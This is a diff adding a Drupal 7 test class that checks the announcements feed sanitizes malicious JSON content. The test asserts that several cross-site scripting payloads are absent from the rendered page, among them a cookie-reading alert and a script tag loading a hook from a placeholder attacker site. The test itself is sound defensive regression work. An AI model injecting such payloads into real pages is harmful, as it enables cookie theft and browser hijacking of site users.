@@ -367,3 +367,67 @@ class AnnounceFeedTestInvalidJsonTestCase extends DrupalWebTestCase {
   }
 }
 
+/**
+ * Tests the announcements feed with malicious content.
+ */
+class AnnounceFeedTestSanitizationTestCase extends DrupalWebTestCase {
+
+  /**
+   * A user with permission to access toolbar and access announcements.
+   *
+   * @var object
+   */
+  protected $user;
+
+  /**
+   * A test endpoint which contains the malicious content.
+   *
+   * @var string
+   */
+  protected $hackedJson;
+
+  public static function getInfo() {
+    return array(
+      'name' => 'Hacked JSON feed URL',
+      'description' => 'Testing announcements feed that contains malicious content.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    global $base_url;
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    parent::setUp('user', 'toolbar', 'announcements_feed', 'announce_feed_test');
+    $this->user = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    $this->drupalLogin($this->user);
+    $this->hackedJson = $base_url . '/announcements-feed-json/hacked';
+    variable_set('announcements_feed_json_url', $this->hackedJson);
+  }
+
+  /**
+   * Test the announcements feed with malicious content.
+   */
+  public function testSanitizedFeedResponse() {
+    $this->user = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertNoRaw("<script>alert('drupal')</script>");
+    $this->assertNoRaw("onerror='alert(123)'");
+    $this->assertNoRaw('alert(document.cookie)');
+    $this->assertNoRaw('<script src=http://attackersite/hook.js></script>');
+    $this->drupalLogout();
+  }
+}
+
